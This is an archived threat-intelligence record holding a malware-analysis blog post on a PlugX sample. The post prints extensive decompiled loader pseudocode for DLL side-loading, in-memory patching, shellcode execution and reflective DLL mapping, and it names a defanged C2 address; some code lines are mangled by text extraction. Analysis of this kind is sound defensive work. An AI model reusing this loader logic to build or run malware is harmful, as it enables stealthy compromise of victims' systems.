{
    "id": "99ba400f-7a8d-4dcf-a6b3-e5737128980e",
    "created_at": "2023-02-02T02:08:54.712255Z",
    "updated_at": "2025-03-27T02:05:23.261583Z",
    "deleted_at": null,
    "sha1_hash": "2d556c7dc439c07b7e7ba17dc5d535027e4fc36b",
    "title": "2023-01-09 - [QuickNote] Another nice PlugX sample",
    "authors": "",
    "file_creation_date": "2023-02-01T07:46:38Z",
    "file_modification_date": "2023-02-01T07:46:38Z",
    "file_size": 1049430,
    "plain_text": "# [QuickNote] Another nice PlugX sample\n\n**[kienmanowar.wordpress.com/2023/01/09/quicknote-another-nice-plugx-sample/](https://kienmanowar.wordpress.com/2023/01/09/quicknote-another-nice-plugx-sample/)**\n\n## Sample information shared by Johann Aydinbas(@jaydinbas):\n\n Sample hash: 2025427bba36b48e827a61116321bbe6b00d77d3fd35d552f72e052eb88948e0\n\n Download here!\n\n\nJanuary 9, 2023\n\n\n-----\n\n## Details of this sample as shown below:\n\n 1. The Mc.exe code will use the LoadLibraryW API function to load McUtil.dll. 2. When McUtil.dll is loaded, the code at DllEntryPoint of this dll will be executed,\n then it will call the function that patch the below address of the LoadLibraryW function into a jump command to the function plx_read_Mc_cp_content_and_exec\n\n Pseudocode at Mc.exe’s mw_load_and_exec_McUtil_dll_code function:\n\n\n-----\n\n```\nDWORD __usercall mw_load_and_exec_McUtil_dll_code@<eax>(MW_CTX ctx@<edi>, const\nwchar_t *file_path@<esi>)\n\n{\n\n wstr_McUtil_dll_full_path = 0;\n\n memset(v7, 0, sizeof(v7));\n\n if ( file_path && *file_path )\n\n {\n\n  wcscpy_s(&wstr_McUtil_dll_full_path, MAX_PATH, file_path);\n\n  if ( *(&v5 + wcslen(&wstr_McUtil_dll_full_path)) == '\\\\' )\n\n  {\n\n   goto LABEL_8;\n\n  }\n\n }\n\n else\n\n {\n\n  GetModuleFileNameW(0, &wstr_McUtil_dll_full_path, MAX_PATH);\n\n  backslash_pos = wcsrchr(&wstr_McUtil_dll_full_path, '\\\\');\n\n  if ( !backslash_pos )\n\n  {\n\n   goto LABEL_8;\n\n  }\n\n  *backslash_pos = 0;\n\n }\n\n wcscat_s(&wstr_McUtil_dll_full_path, MAX_PATH, L\"\\\\\");\n\nLABEL_8:\n\n wcscat_s(&wstr_McUtil_dll_full_path, MAX_PATH, ctx->wstr_McUtil_dll);\n\n // Load McUtil.dll and exec McUtil.dll's DllEntryPoint -> exec the patching/hooking\nfunction\n\n McUtil_dll_hdl = LoadLibraryW(&wstr_McUtil_dll_full_path);\n\n ctx->McUtil_dll_hdl = McUtil_dll_hdl;     // this instruction will be patched\nto jump to plx_read_Mc_cp_content_and_exec function in McUtil.dll\n\n if ( McUtil_dll_hdl )\n\n {\n\n  dwResult = 0;\n\n }\n\n else\n\n {\n\n  dwResult = GetLastError();\n\n }\n\n return dwResult;\n\n}\n\n## The pseudocode at the plx_patching_func function of McUtil.dll performs the task of patching code:\n\n```\n\n-----\n\n```\n// This function will patch address at Mc_exe to jump to\nplx_read_Mc_cp_content_and_exec function\n\nchar __stdcall plx_patching_func()\n\n{\n\n base_idx = g_str_index;\n\n str_GetSystemTime = &g_dec_str[g_str_index];\n\n str_GetSystemTime = &g_dec_str[g_str_index];\n\n offset = &g_enc_GetSystemTime - &g_dec_str[g_str_index];\n\n len_str = 13;\n\n do\n\n {\n\n  *str_GetSystemTime = ((str_GetSystemTime[offset] - 0x62) ^ 0x3F) + 0x62;//\nGetSystemTime\n\n  ++str_GetSystemTime;\n\n  --len_str;\n\n }\n\n while ( len_str );\n\n str_GetSystemTime[0xD] = 0;\n\n g_str_index = base_idx + 0xE;\n\n // retrieve base address of kernel32.dll\n\n if ( !g_kernel32_dll_handle )\n\n {\n\n  ldr_entry = NtCurrentPeb()->Ldr->InInitializationOrderModuleList.Flink;\n\n  // 0x1A: maximum_length\n\n  // 0x18: length\n\n  // of \"kernel32.dll\"\n\n  while ( *&ADJ(ldr_entry)->BaseDllName.Length != 0x1A0018 )\n\n  {\n\n   ldr_entry = ADJ(ldr_entry)->InInitializationOrderLinks.Flink;\n\n   if ( !ldr_entry )\n\n   {\n\n    goto LABEL_9;\n\n   }\n\n  }\n\n  g_kernel32_dll_handle = ADJ(ldr_entry)->DllBase;\n\n }\n\nLABEL_9:\n\n GetSystemTime = GetProcAddress(g_kernel32_dll_handle, str_GetSystemTime);\n\n GetSystemTime(&SystemTime);\n\n tmp_var.dwRandomNum = SystemTime.wDay + 0x64 * (SystemTime.wMonth + 0x64 *\nSystemTime.wYear);\n\n if ( tmp_var.dwRandomNum < 20140606 )\n\n {\n\n  return tmp_var.dwRandomNum;\n\n }\n\n Mc_exe_base_addr = GetModuleHandleA(0);          // return base address of\nMc.exe\n\n str_VirtualProtect = &g_dec_str[g_str_index];\n\n len_str = 14;\n\n offset = &g_enc_VirtualProtect - &g_dec_str[g_str_index];\n\n pTargetAddressAtMcExe = Mc_exe_base_addr + 0xBC3;\n\n```\n\n-----\n\n```\n str_VirtualProtect &g_dec_str[g_str_index];\n\n g_str_index += 14;\n\n do\n\n {\n\n  *str_VirtualProtect = ((str_VirtualProtect[offset] - 0xF) ^ 0x3F) + 0xF;//\nVirtualProtect\n\n  ++str_VirtualProtect;\n\n  --len_str;\n\n }\n\n while ( len_str );\n\n ++g_str_index;\n\n str_VirtualProtect[0xE] = 0;\n\n if ( !g_kernel32_dll_handle )\n\n {\n\n  ldr_entry = NtCurrentPeb()->Ldr->InInitializationOrderModuleList.Flink;\n\n  while ( *&ADJ(ldr_entry)->BaseDllName.Length != 0x1A0018 )\n\n  {\n\n   ldr_entry = ADJ(ldr_entry)->InInitializationOrderLinks.Flink;\n\n   if ( !ldr_entry )\n\n   {\n\n    goto change_protection_and_patch_target_address;\n\n   }\n\n  }\n\n  g_kernel32_dll_handle = ADJ(ldr_entry)->DllBase;\n\n }\n\nchange_protection_and_patch_target_address:\n\n VirtualProtect = GetProcAddress(g_kernel32_dll_handle, str_VirtualProtect);\n\n tmp_var.dwRes = VirtualProtect(pTargetAddressAtMcExe, 0x10u,\nPAGE_EXECUTE_READWRITE, &flOldProtect);\n\n if ( !tmp_var.dwRes )\n\n {\n\n  return tmp_var.dwRandomNum;\n\n }\n\n tmp_var.disp_to_plx_read_Mc_cp_content_and_exec = plx_read_Mc_cp_content_and_exec pTargetAddressAtMcExe - 5;\n\n HIBYTE(v18) = HIBYTE(tmp_var.disp_to_plx_read_Mc_cp_content_and_exec);\n\n pTargetAddressAtMcExe[1] = tmp_var.disp_to_plx_read_Mc_cp_content_and_exec;\n\n LOBYTE(tmp_var.disp_to_plx_read_Mc_cp_content_and_exec) = HIBYTE(v18);\n\n *pTargetAddressAtMcExe = 0xE9;              // jmp opcode\n\n pTargetAddressAtMcExe[2] = BYTE1(tmp_var.disp_to_plx_read_Mc_cp_content_and_exec);\n\n pTargetAddressAtMcExe[3] = (plx_read_Mc_cp_content_and_exec - pTargetAddressAtMcExe\n- 5) >> 0x10;\n\n pTargetAddressAtMcExe[4] = tmp_var.disp_to_plx_read_Mc_cp_content_and_exec;\n\n return tmp_var.dwRandomNum;\n\n}\n\n```\n\n-----\n\n## The pseudocode at the function plx_read_Mc_cp_content_and_exec of McUtil.dll performs the task of reading the entire contents of Mc.cp into the allocated memory and executing the shellcode.\n\n\n-----\n\n```\nvoid __stdcall plx_read_Mc_cp_content_and_exec()\n\n{\n\n tmp_index = g_str_index;\n\n str_VirtualAlloc = &g_dec_str[g_str_index];\n\n str_VirtualAlloc = &g_dec_str[g_str_index];\n\n offset = &g_enc_VirtualAlloc - &g_dec_str[g_str_index];\n\n len_str = 12;\n\n do\n\n {\n\n  *str_VirtualAlloc = ((str_VirtualAlloc[offset] + 0x74) ^ 0x3F) - 0x74;//\nVirtualAlloc\n\n  ++str_VirtualAlloc;\n\n  --len_str;\n\n }\n\n while ( len_str );\n\n g_str_index = tmp_index + 0xD;\n\n str_VirtualAlloc[0xC] = 0;\n\n if ( !g_kernel32_dll_handle )\n\n {\n\n  ldr_entry = NtCurrentPeb()->Ldr->InInitializationOrderModuleList.Flink;\n\n  while ( *&ADJ(ldr_entry)->BaseDllName.Length != 0x1A0018 )\n\n  {\n\n   ldr_entry = ADJ(ldr_entry)->InInitializationOrderLinks.Flink;\n\n   if ( !ldr_entry )\n\n   {\n\n    goto alloc_mem;\n\n   }\n\n  }\n\n  g_kernel32_dll_handle = ADJ(ldr_entry)->DllBase;\n\n }\n\nalloc_mem:\n\n VirtualAlloc = GetProcAddress(g_kernel32_dll_handle, str_VirtualAlloc);\n\n ptr_shellcode = VirtualAlloc(0, 0x100000u, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\n tmp_index = g_str_index;\n\n tmp_var.ptr_shellcode = ptr_shellcode;\n\n str_GetModuleFileNameW = &g_dec_str[g_str_index];\n\n str_GetModuleFileNameW = &g_dec_str[g_str_index];\n\n offset = &g_enc_GetModuleFileNameW - &g_dec_str[g_str_index];\n\n len_str = 18;\n\n do\n\n {\n\n  *str_GetModuleFileNameW = ((str_GetModuleFileNameW[offset] - 0x40) ^ 0x3F) +\n0x40;// GetModuleFileNameW\n\n  ++str_GetModuleFileNameW;\n\n  --len_str;\n\n }\n\n while ( len_str );\n\n str_GetModuleFileNameW[0x12] = 0;\n\n g_str_index = tmp_index + 0x13;\n\n if ( !g_kernel32_dll_handle )\n\n {\n\n```\n\n-----\n\n```\n  ldr_entry NtCurrentPeb() >Ldr >InInitializationOrderModuleList.Flink;\n\n  while ( *&ADJ(ldr_entry)->BaseDllName.Length != 0x1A0018 )\n\n  {\n\n   ldr_entry = ADJ(ldr_entry)->InInitializationOrderLinks.Flink;\n\n   if ( !ldr_entry )\n\n   {\n\n    goto get_mw_path;\n\n   }\n\n  }\n\n  g_kernel32_dll_handle = ADJ(ldr_entry)->DllBase;\n\n }\n\nget_mw_path:\n\n GetModuleFileNameW = GetProcAddress(g_kernel32_dll_handle, str_GetModuleFileNameW);\n\n path_length = GetModuleFileNameW(0, tmp_var.wstr_Mc_cp_full_path, 0x1000u);\n\n str_lstrcpyW = &g_dec_str[g_str_index];\n\n strcpy(&g_dec_str[g_str_index], \"lstrcpyW\");\n\n g_str_index += 9;\n\n if ( !g_kernel32_dll_handle )\n\n {\n\n  ldr_entry = NtCurrentPeb()->Ldr->InInitializationOrderModuleList.Flink;\n\n  while ( *&ADJ(ldr_entry)->BaseDllName.Length != 0x1A0018 )\n\n  {\n\n   ldr_entry = ADJ(ldr_entry)->InInitializationOrderLinks.Flink;\n\n   if ( !ldr_entry )\n\n   {\n\n    goto build_Mc_cp_path;\n\n   }\n\n  }\n\n  g_kernel32_dll_handle = ADJ(ldr_entry)->DllBase;\n\n }\n\nbuild_Mc_cp_path:\n\n lstrcpyW = GetProcAddress(g_kernel32_dll_handle, str_lstrcpyW);\n\n idx = --path_length;\n\n if ( path_length )\n\n {\n\n  while ( tmp_var.wstr_Mc_cp_full_path[idx] != '\\\\' )\n\n  {\n\n   path_length = --idx;\n\n   if ( !idx )\n\n   {\n\n    goto read_and_exec_shellcode;\n\n   }\n\n  }\n\n  lstrcpyW(&tmp_var.wstr_Mc_cp_full_path[idx + 1], L\"Mc.cp\");\n\n }\n\nread_and_exec_shellcode:\n\n tmp_index = g_str_index;\n\n str_CreateFileW = &g_dec_str[g_str_index];\n\n str_CreateFileW = &g_dec_str[g_str_index];\n\n offset = &g_enc_CreateFileW - &g_dec_str[g_str_index];\n\n len_str = 11;\n\n do\n\n```\n\n-----\n\n```\n {\n\n  *str_CreateFileW = ((str_CreateFileW[offset] + 0x7B) ^ 0x3F) - 0x7B;\n\n  ++str_CreateFileW;\n\n  --len_str;\n\n }\n\n while ( len_str );\n\n str_CreateFileW[0xB] = 0;\n\n g_str_index = tmp_index + 0xC;\n\n if ( !g_kernel32_dll_handle )\n\n {\n\n  ldr_entry = NtCurrentPeb()->Ldr->InInitializationOrderModuleList.Flink;\n\n  while ( *&ADJ(ldr_entry)->BaseDllName.Length != 0x1A0018 )\n\n  {\n\n   ldr_entry = ADJ(ldr_entry)->InInitializationOrderLinks.Flink;\n\n   if ( !ldr_entry )\n\n   {\n\n    goto get_handle_to_Mc_for_reading;\n\n   }\n\n  }\n\n  g_kernel32_dll_handle = ADJ(ldr_entry)->DllBase;\n\n }\n\nget_handle_to_Mc_for_reading:\n\n CreateFileW = GetProcAddress(g_kernel32_dll_handle, str_CreateFileW);\n\n Mc_cp_hdl = CreateFileW(tmp_var.wstr_Mc_cp_full_path, GENERIC_READ,\nFILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);\n\n if ( Mc_cp_hdl != INVALID_HANDLE_VALUE )\n\n {\n\n  str_ReadFile = &g_dec_str[g_str_index];\n\n  strcpy(&g_dec_str[g_str_index], \"ReadFile\");\n\n  g_str_index += 9;\n\n  if ( !g_kernel32_dll_handle )\n\n  {\n\n   ldr_entry = NtCurrentPeb()->Ldr->InInitializationOrderModuleList.Flink;\n\n   while ( *&ADJ(ldr_entry)->BaseDllName.Length != 0x1A0018 )\n\n   {\n\n    ldr_entry = ADJ(ldr_entry)->InInitializationOrderLinks.Flink;\n\n    if ( !ldr_entry )\n\n    {\n\n     goto read_Mc_content_and_exec_shellcode;\n\n    }\n\n   }\n\n   g_kernel32_dll_handle = ADJ(ldr_entry)->DllBase;\n\n  }\n\nread_Mc_content_and_exec_shellcode:\n\n  ReadFile = GetProcAddress(g_kernel32_dll_handle, str_ReadFile);\n\n  if ( ReadFile(Mc_cp_hdl, tmp_var.ptr_shellcode, 0x100000u, &path_length, 0) )\n\n  {\n\n   tmp_var.ptr_shellcode(0);               // exec shellcode\n\n   str_Sleep = &g_dec_str[g_str_index];\n\n   strcpy(&g_dec_str[g_str_index], \"Sleep\");\n\n   g_str_index += 6;\n\n   if ( !g_kernel32_dll_handle )\n\n```\n\n-----\n\n```\n   {\n\n    ldr_entry = NtCurrentPeb()->Ldr->InInitializationOrderModuleList.Flink;\n\n    while ( *&ADJ(ldr_entry)->BaseDllName.Length != 0x1A0018 )\n\n    {\n\n     ldr_entry = ADJ(ldr_entry)->InInitializationOrderLinks.Flink;\n\n     if ( !ldr_entry )\n\n     {\n\n      goto sleep;\n\n     }\n\n    }\n\n    g_kernel32_dll_handle = ADJ(ldr_entry)->DllBase;\n\n   }\n\nsleep:\n\n   Sleep = GetProcAddress(g_kernel32_dll_handle, str_Sleep);\n\n   Sleep(4294967295u);\n\n  }\n\n }\n\n}\n\n## Shellcode at Mc.cp will perform decrypting of the second shellcode and executes this shellcode:\n\n The second shellcode unpacks the final PlugX Dll, maps it to the allocated memory and calls the Dll’s DllEntryPoint to execute it.\n\n```\n\n-----\n\n## The whole pseudocode of this second shellcode is as below:\n\n\n-----\n\n```\nint __stdcall plx_load_dll_from_memory(PLX_SHELLCODE_CTX sc_ctx)\n\n{\n\n ldr_entry = NtCurrentPeb()->Ldr->InInitializationOrderModuleList.Flink;\n\n while ( *&ADJ(ldr_entry)->BaseDllName.Length != 0x1A0018 )\n\n {\n\n  ldr_entry = ADJ(ldr_entry)->InInitializationOrderLinks.Flink;\n\n  if ( !ldr_entry )\n\n   return 1;\n\n }\n\n kernel32_base_addr = ADJ(ldr_entry)->DllBase;\n\n if ( !kernel32_base_addr )\n\n  return 1;\n\n pExportDir = (kernel32_base_addr + *(kernel32_base_addr + *(kernel32_base_addr +\n0xF) + 0x78));\n\n numApiNames = pExportDir->NumberOfNames;\n\n idx = 0;\n\n if ( numApiNames <= 0 )\n\n  goto LABEL_21;\n\n // find GetProcAdderss\n\n while ( TRUE )\n\n {\n\n  str_GetProcAdderss = kernel32_base_addr + *(kernel32_base_addr + 4 * idx +\npExportDir->AddressOfNames);\n\n  if ( *str_GetProcAdderss == 'G'\n\n   && str_GetProcAdderss[1] == 'e'\n\n   && str_GetProcAdderss[2] == 't'\n\n   && str_GetProcAdderss[3] == 'P'\n\n   && str_GetProcAdderss[4] == 'r'\n\n   && str_GetProcAdderss[5] == 'o'\n\n   && str_GetProcAdderss[6] == 'c'\n\n   && str_GetProcAdderss[7] == 'A'\n\n   && str_GetProcAdderss[8] == 'd'\n\n   && str_GetProcAdderss[9] == 'd' )\n\n  {\n\n   break;\n\n  }\n\n  if ( ++idx >= numApiNames )\n\n   goto LABEL_21;\n\n }\n\n GetProcAddress_rva = *(kernel32_base_addr + 4 * *(kernel32_base_addr + 2 * idx +\npExportDir->AddressOfNameOrdinals) + pExportDir->AddressOfFunctions);\n\n // retrieve GetProcAdderss addr\n\n bRet = kernel32_base_addr + GetProcAddress_rva == 0;\n\n GetProcAddress = (kernel32_base_addr + GetProcAddress_rva);\n\n if ( bRet )\n\n {\n\nLABEL_21:\n\n  dwRes = 2;\n\n  goto exit;\n\n }\n\n strcpy(str_LoadLibraryA, \"LoadLibraryA\");\n\n```\n\n-----\n\n```\n LoadLibraryA GetProcAddress(kernel32_base_addr, str_LoadLibraryA);\n\n if ( !LoadLibraryA )\n\n {\n\n  dwRes = 3;\n\n  goto exit;\n\n }\n\n strcpy(str_VirtualAlloc, \"VirtualAlloc\");\n\n VirtualAlloc = GetProcAddress(kernel32_base_addr, str_VirtualAlloc);\n\n if ( !VirtualAlloc )\n\n {\n\n  dwRes = 4;\n\n  goto exit;\n\n }\n\n strcpy(str_VirtualFree, \"VirtualFree\");\n\n VirtualFree = GetProcAddress(kernel32_base_addr, str_VirtualFree);\n\n if ( !VirtualFree )\n\n {\n\n  dwRes = 5;\n\n  goto exit;\n\n }\n\n strcpy(str_ntdll, \"ntdll\");\n\n ntdll_handle = LoadLibraryA(str_ntdll);\n\n if ( !ntdll_handle )\n\n {\n\n  dwRes = 7;\n\n  goto exit;\n\n }\n\n strcpy(str_RtlDecompressBuffer, \"RtlDecompressBuffer\");\n\n tmp_var.RtlDecompressBuffer = GetProcAddress(ntdll_handle,\nstr_RtlDecompressBuffer);\n\n if ( !tmp_var.RtlDecompressBuffer )\n\n {\n\n  dwRes = 8;\n\n  goto exit;\n\n }\n\n strcpy(str_memcpy, \"memcpy\");\n\n tmp_var1.memcpy = GetProcAddress(ntdll_handle, str_memcpy);\n\n if ( !tmp_var1.memcpy )\n\n {\n\n  dwRes = 9;\n\n  goto exit;\n\n }\n\n uncompressed_buffer_size = *sc_ctx->uncompressed_buffer_size;// 0x26400\n\n uncompressed_buffer = VirtualAlloc(0, uncompressed_buffer_size, MEM_COMMIT,\nPAGE_READWRITE);\n\n if ( !uncompressed_buffer )\n\n {\n\n  dwRes = 0xC;\n\n  goto exit;\n\n }\n\n if ( tmp_var.RtlDecompressBuffer(\n\n     COMPRESSION_FORMAT_LZNT1,\n\n```\n\n-----\n\n```\n     uncompressed_buffer,\n\n     uncompressed_buffer_size,\n\n     sc_ctx->uncompressed_buffer_size + 4, // compressed dll buffer (offset\n0x523)\n\n     sc_ctx->dll_uncompressed_size - 4,   // 0x1C252\n\n     &final_uncompressed_size) )\n\n {\n\n  dwRes = 0xD;\n\n  goto exit;\n\n }\n\n if ( final_uncompressed_size != uncompressed_buffer_size )\n\n {\n\n  dwRes = 0xE;\n\n  goto exit;\n\n }\n\n if ( *uncompressed_buffer != 'VX' )\n\n {\n\n  dwRes = 0xF;\n\n  goto exit;\n\n }\n\n decompressed_dll_nt_headers = &uncompressed_buffer[*(uncompressed_buffer + 0xF)];\n\n if ( decompressed_dll_nt_headers->Signature != 'VX' )\n\n {\n\n  dwRes = 0x10;\n\n  goto exit;\n\n }\n\n plugx_mapped_dll = VirtualAlloc(0, decompressed_dll_nt_headers>OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\n tmp_var3.ptr_plugx_mapped_dll = plugx_mapped_dll;\n\n if ( !plugx_mapped_dll )\n\n {\n\n  dwRes = 0x11;\n\n  goto exit;\n\n }\n\n AddressOfEntryPoint = decompressed_dll_nt_headers>OptionalHeader.AddressOfEntryPoint;\n\n tmp_var2.cnt = 0;\n\n // retrieve the address of DllEntryPoint in mapped address\n\n ptr_PlugX_dll_entry_point = (plugx_mapped_dll + AddressOfEntryPoint);\n\n // copy sections\n\n decompressed_dll_section_headers = (&decompressed_dll_nt_headers->OptionalHeader +\ndecompressed_dll_nt_headers->FileHeader.SizeOfOptionalHeader);\n\n if ( decompressed_dll_nt_headers->FileHeader.NumberOfSections )\n\n {\n\n  pRawAddr = &decompressed_dll_section_headers->PointerToRawData;\n\n  do\n\n  {\n\n   tmp_var1.memcpy(\n\n    plugx_mapped_dll + ADJ(pRawAddr)->VirtualAddress,// mapped_addr +\nsection.VirtualAddress\n\n    &uncompressed_buffer[ADJ(pRawAddr)->PointerToRawData],//\nuncompressed_dll_addr + section.RawAddress\n\n```\n\n-----\n\n```\n    ADJ(pRawAddr) >SizeOfRawData);     // section.RawSize\n\n   num_of_sections = decompressed_dll_nt_headers->FileHeader.NumberOfSections;\n\n   ++tmp_var2.cnt;\n\n   pRawAddr += 0xA;             // next section\n\n  }\n\n  while ( tmp_var2.cnt < num_of_sections );\n\n }\n\n // PerformBaseRelocation\n\n reloc_dir_rva = decompressed_dll_nt_headers>OptionalHeader.DataDirectory[5].VirtualAddress;\n\n if ( reloc_dir_rva && decompressed_dll_nt_headers>OptionalHeader.DataDirectory[5].Size )\n\n {\n\n  for ( relocation = (plugx_mapped_dll + reloc_dir_rva); ; relocation = (relocation\n+ relocation->SizeOfBlock) )\n\n  {\n\n   SizeOfBlock = relocation->SizeOfBlock;\n\n   if ( !SizeOfBlock )\n\n    break;\n\n   relItems = 0;\n\n   if ( (SizeOfBlock - IMAGE_SIZEOF_BASE_RELOCATION) >> 1 )// Items = relocation>SizeOfBlock-IMAGE_SIZEOF_BASE_RELOCATION) / 2\n\n   {\n\n    do\n\n    {\n\n     relocation_entry = &relocation[1] + relItems;\n\n     rel_type = *relocation_entry >> 0xC;\n\n     if ( rel_type )\n\n     {\n\n      if ( rel_type == IMAGE_REL_BASED_HIGHLOW )\n\n      {\n\n       offset = relocation->VirtualAddress + (*relocation_entry & 0xFFF);\n       *(plugx_mapped_dll + offset) += plugx_mapped_dll decompressed_dll_nt_headers->OptionalHeader.ImageBase;\n\n      }\n\n      else\n\n      {\n\n       if ( rel_type != IMAGE_REL_BASED_DIR64 )\n\n       {\n\n        dwRes = 0x12;\n\n        goto exit;\n\n       }\n\n       tmp_var1.offset = plugx_mapped_dll + relocation->VirtualAddress +\n(*relocation_entry & 0xFFF);\n\n       tmp_var.offset = 0;\n\n       v24.memcpy = tmp_var1.memcpy;\n\n       v22 = (plugx_mapped_dll - decompressed_dll_nt_headers>OptionalHeader.ImageBase) >> 0x20;\n\n       v23 = plugx_mapped_dll - decompressed_dll_nt_headers>OptionalHeader.ImageBase;\n\n       v25 = __CFADD__(v23, ADJ(tmp_var1.pVirtualAddress)->VirtualAddress);\n\n       ADJ(tmp_var1.pVirtualAddress)->VirtualAddress += v23;\n\n```\n\n-----\n\n```\n       plugx_mapped_dll tmp_var3.ptr_plugx_mapped_dll;\n\n       *(v24.offset + 4) += v22 + v25;\n\n      }\n\n     }\n\n     SizeOfBlock = relocation->SizeOfBlock;\n\n     relItems = (relItems + 1);\n\n    }\n\n    while ( relItems < ((SizeOfBlock - IMAGE_SIZEOF_BASE_RELOCATION) >> 1) );\n\n   }\n\n  }\n\n }\n\n // fill null bytes\n\n if ( decompressed_dll_nt_headers->OptionalHeader.DataDirectory[5].VirtualAddress )\n\n {\n\n  reloc_dir_size = decompressed_dll_nt_headers>OptionalHeader.DataDirectory[5].Size;\n\n  if ( reloc_dir_size )\n\n  {\n\n   j = 0;\n\n   if ( reloc_dir_size > 0 )\n\n   {\n\n    do\n\n    {\n\n     delta_offset = j + decompressed_dll_nt_headers>OptionalHeader.DataDirectory[5].VirtualAddress;\n\n     ++j;\n\n     *(plugx_mapped_dll + delta_offset) = 0;\n\n    }\n\n    while ( j < decompressed_dll_nt_headers->OptionalHeader.DataDirectory[5].Size\n);\n   }\n\n  }\n\n }\n\n // BuildImportTable\n\n import_desc_rva = decompressed_dll_nt_headers>OptionalHeader.DataDirectory[1].VirtualAddress;\n\n if ( import_desc_rva && decompressed_dll_nt_headers>OptionalHeader.DataDirectory[1].Size )\n\n {\n\n  import_desc_va = (plugx_mapped_dll + import_desc_rva);\n\n  for ( tmp_var2.import_desc_va = import_desc_va; ; import_desc_va =\ntmp_var2.import_desc_va )\n\n  {\n\n   thunkRef = import_desc_va->OriginalFirstThunk;\n\n   if ( !thunkRef )\n\n    break;\n\n   funcRef = tmp_var2.import_desc_va->FirstThunk;\n\n   tmp_var.thunkData = (plugx_mapped_dll + thunkRef);\n\n   pImportAddressTbl = plugx_mapped_dll + funcRef;\n\n   tmp_var1.dll_handle = LoadLibraryA(plugx_mapped_dll + tmp_var2.import_desc_va>Name);\n\n   if ( !tmp_var1.dll_handle )\n\n```\n\n-----\n\n```\n   {\n\n    dwRes = 0x13;\n\n    goto exit;\n\n   }\n\n   thunkData = tmp_var.thunkData;\n\n   j = 0;\n\n   tmp_var3.cnt = 0;\n\n   if ( *tmp_var.thunkData )\n\n   {\n\n    while ( TRUE )\n\n    {\n\n     pImportNameTbl = *thunkData;\n\n     relItems = &pImportAddressTbl[j];   // pImportAddressTbl\n\n     apiAddr = *&pImportNameTbl >= 0 ? GetProcAddress(\n\n                       tmp_var1.dll_handle,\n\n                       plugx_mapped_dll + *&pImportNameTbl +\noffsetof(IMAGE_IMPORT_BY_NAME, Name)) : GetProcAddress(\n\ntmp_var1.dll_handle,\n\npImportNameTbl.Hint);\n\n     *relItems = apiAddr;         // pIAT[j] = apiAddr\n\n     if ( !*relItems )\n\n      break;\n\n     ++tmp_var3.cnt;\n\n     j = 4 * tmp_var3.cnt;\n\n     thunkData = &tmp_var.thunkData[tmp_var3.cnt];// next import\n\n     if ( !*thunkData )\n\n      goto LABEL_76;\n\n    }\n\n    dwRes = 0x14;\n\n    goto exit;\n\n   }\n\nLABEL_76:\n\n   tmp_var2.offset += 0x14;\n\n  }\n\n }\n\n import_desc_rva = decompressed_dll_nt_headers>OptionalHeader.DataDirectory[1].VirtualAddress;\n\n cnt = 0;\n\n if ( import_desc_rva && decompressed_dll_nt_headers>OptionalHeader.DataDirectory[1].Size )\n\n {\n\n  v44 = 0;\n\n  if ( decompressed_dll_nt_headers->FileHeader.NumberOfSections )\n\n  {\n\n   tmp_var3.pVirtualAddress = &decompressed_dll_section_headers->VirtualAddress;\n\n   while ( 1 )\n\n   {\n\n    if ( import_desc_rva > ADJ(tmp_var3.pVirtualAddress)->VirtualAddress )\n\n    {\n\n     tmp_var.nextVirtuaAddr = ADJ(tmp_var3.pVirtualAddress)->VirtualAddress +\n\n```\n\n-----\n\n```\ndecompressed_dll_section_headers >Misc.VirtualSize;\n\n     import_desc_rva = decompressed_dll_nt_headers>OptionalHeader.DataDirectory[1].VirtualAddress;\n\n     if ( import_desc_rva < tmp_var.nextVirtuaAddr )\n\n      break;\n\n    }\n\n    num_of_sections = decompressed_dll_nt_headers->FileHeader.NumberOfSections;\n\n    tmp_var3.pVirtualAddress += 0xA;\n\n    if ( ++cnt >= num_of_sections )\n\n     goto wipe_import_dir_info;\n\n   }\n\n   v44 = decompressed_dll_section_headers[cnt].Misc.VirtualSize +\ndecompressed_dll_section_headers[cnt].VirtualAddress - import_desc_rva;\n\n  }\n\nwipe_import_dir_info:\n\n  for ( i = 0; i < v44; v47[decompressed_dll_nt_headers>OptionalHeader.DataDirectory[1].VirtualAddress] = 0 )\n\n   v47 = plugx_mapped_dll + i++;\n\n }\n\n // exec PlugX Dll from EntryPoint\n\n if ( ptr_PlugX_dll_entry_point(plugx_mapped_dll, DLL_PROCESS_ATTACH, sc_ctx) )\n {\n\n  VirtualFree(uncompressed_buffer, 0, MEM_RELEASE);\n\n  result = 0;\n\n }\n\n else\n\n {\n\n  dwRes = 0x15;\n\nexit:\n\n  result = dwRes;\n\n }\n\n return result;\n\n}\n\n## PlugX Dll performs the task of decrypting the configuration, which contains information about C2 that the malicious code will connect to:\n\n```\n\n-----\n\n## The malware will inject into the svchost.exe process, then make a connection to the C2 address ( svchost.exe requested TCP 45[.]79.125.11:443)\n\n End.\n\n m4n0w4r\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-01-09 - [QuickNote] Another nice PlugX sample.pdf"
    ],
    "report_names": [
        "2023-01-09 - [QuickNote] Another nice PlugX sample.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1675303734,
    "ts_updated_at": 1743041123,
    "ts_creation_date": 1675237598,
    "ts_modification_date": 1675237598,
    "files": {
        "pdf": "https://archive.orkl.eu/2d556c7dc439c07b7e7ba17dc5d535027e4fc36b.pdf",
        "text": "https://archive.orkl.eu/2d556c7dc439c07b7e7ba17dc5d535027e4fc36b.txt",
        "img": "https://archive.orkl.eu/2d556c7dc439c07b7e7ba17dc5d535027e4fc36b.jpg"
    }
}